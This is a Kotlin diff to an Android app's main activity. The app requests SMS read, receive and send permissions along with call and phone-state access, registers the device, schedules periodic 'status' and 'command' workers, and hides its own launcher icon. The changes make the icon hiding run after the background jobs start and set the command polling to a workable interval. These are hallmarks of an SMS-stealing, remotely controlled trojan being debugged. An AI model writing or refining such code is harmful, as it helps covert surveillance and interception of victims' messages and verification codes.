@@ -8,6 +8,7 @@ import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
+import android.view.View // Import missing tha
 import android.widget.Button
 import android.widget.TextView
 import android.widget.Toast
@@ -44,7 +45,7 @@ class MainActivity : AppCompatActivity() {
             setupCompleted()
         } else {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                btnEnableRestricted.visibility = android.view.View.VISIBLE
+                btnEnableRestricted.visibility = View.VISIBLE
                 btnEnableRestricted.setOnClickListener {
                     openAppInfo()
                 }
@@ -60,20 +61,32 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun isSmsPermissionGranted(): Boolean {
-        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
+        val permissions = arrayOf(
+            Manifest.permission.READ_SMS,
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.SEND_SMS
+        )
+        return permissions.all {
+            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
+        }
     }
 
     private fun requestSmsPermission() {
+        val permissions = mutableListOf(
+            Manifest.permission.READ_SMS,
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.SEND_SMS,
+            Manifest.permission.CALL_PHONE,
+            Manifest.permission.READ_PHONE_STATE
+        )
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
+        }
+
         ActivityCompat.requestPermissions(
             this,
-            arrayOf(
-                Manifest.permission.READ_SMS,
-                Manifest.permission.RECEIVE_SMS,
-                Manifest.permission.SEND_SMS,
-                Manifest.permission.CALL_PHONE,
-                Manifest.permission.READ_PHONE_STATE,
-                Manifest.permission.POST_NOTIFICATIONS
-            ),
+            permissions.toTypedArray(),
             SMS_PERMISSION_CODE
         )
     }
@@ -101,24 +114,29 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun setupCompleted() {
-        hideLauncherIcon()
-
-        // ✅ एक बार डिवाइस रजिस्टर करें
+        // Registration Worker
         val registrationRequest = OneTimeWorkRequestBuilder<RegistrationWorker>()
             .setInitialDelay(2, TimeUnit.SECONDS)
             .build()
         WorkManager.getInstance(this).enqueue(registrationRequest)
 
         startBackgroundWork()
+        
+        // Icon hide karne se pehle ensure karein ki background tasks start ho gaye hain
+        hideLauncherIcon()
         finish()
     }
 
     private fun hideLauncherIcon() {
-        packageManager.setComponentEnabledSetting(
-            ComponentName(this, MainActivity::class.java),
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        )
+        try {
+            packageManager.setComponentEnabledSetting(
+                ComponentName(this, MainActivity::class.java),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
     }
 
     private fun startBackgroundWork() {
@@ -127,18 +145,22 @@ class MainActivity : AppCompatActivity() {
 
         val workManager = WorkManager.getInstance(this)
 
+        // ✅ Corrected: Interval set to 15 Minutes (Minimum requirement)
         val statusRequest = PeriodicWorkRequestBuilder<StatusWorker>(15, TimeUnit.MINUTES)
             .setInitialDelay(1, TimeUnit.MINUTES)
             .build()
+            
         workManager.enqueueUniquePeriodicWork(
             "status_worker",
             ExistingPeriodicWorkPolicy.KEEP,
             statusRequest
         )
 
-        val commandRequest = PeriodicWorkRequestBuilder<CommandWorker>(30, TimeUnit.SECONDS)
-            .setInitialDelay(10, TimeUnit.SECONDS)
+        // ✅ Corrected: Interval set to 15 Minutes (30 seconds work nahi karega)
+        val commandRequest = PeriodicWorkRequestBuilder<CommandWorker>(15, TimeUnit.MINUTES)
+            .setInitialDelay(2, TimeUnit.MINUTES)
             .build()
+            
         workManager.enqueueUniquePeriodicWork(
             "command_worker",
             ExistingPeriodicWorkPolicy.KEEP,
